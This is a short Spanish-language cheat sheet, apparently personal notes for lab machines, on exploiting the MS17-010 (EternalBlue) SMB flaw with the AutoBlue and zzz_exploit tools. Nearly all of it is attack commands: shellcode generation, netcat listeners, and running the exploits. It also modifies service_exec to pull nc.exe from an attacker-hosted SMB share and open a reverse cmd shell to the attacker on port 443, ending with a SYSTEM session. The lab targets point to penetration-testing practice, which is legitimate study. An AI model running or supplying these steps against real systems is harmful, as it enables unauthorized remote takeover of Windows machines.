** Autoblue Github **
https://github.com/3ndG4me/AutoBlue-MS17-010
>Comprobar named_pipes
>`python eternal_checker.py 10.10.10.40`
>Generar shellcode
>Creará una shellcode de 32 y 64 bits, pedirá LHOST y puertos para 32 y 64 bits.
>`./shell_prep.sh`
>Sesiones en netcat para 32 y 64 bits
>`rlwrap nc -nlvp 4646`
>`rlwrap nc -nlvp 4545`
>Ejecutar eternalblue
>`python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin`
>Devuelve sesión por netcat con permisos de nt_authority/system

** zzz_exploit github **
https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
>Chequeamos posibles named_pipes ejecutando desbordamiento de bufer
>`python checher.py 10.10.10.40`
> SI todos los named_pipes dan access_denied, modificar el archivo cheker.py introduciendo las credenciales (si las tenemos).
> Sobreescribir el archivo zzz_exploit.py
> Introducir credenciales si las tenemos.
> función smb-pwn: 
> * comentar la creación del fichero .txt
> * descomentar service_exec
> * cambiar service_exec a:
> * service_exec(conn, r'cmd /c \\<own_ip>\smbFolder\nc.exe -e cmd <own_ip> 443)

> Además debemos tener un servidor SMB compartiendo el recurso nc.exe
> `impacket-smbserver smbForder $(pwd) -smb2support`
> Poner en local el puerto 443 en escucha.
> `rlwrap nc -nlvp 443`
> Ejecutar zzz_exploit.
> `python zzz_exploit.py 10.10.10.93 samr`

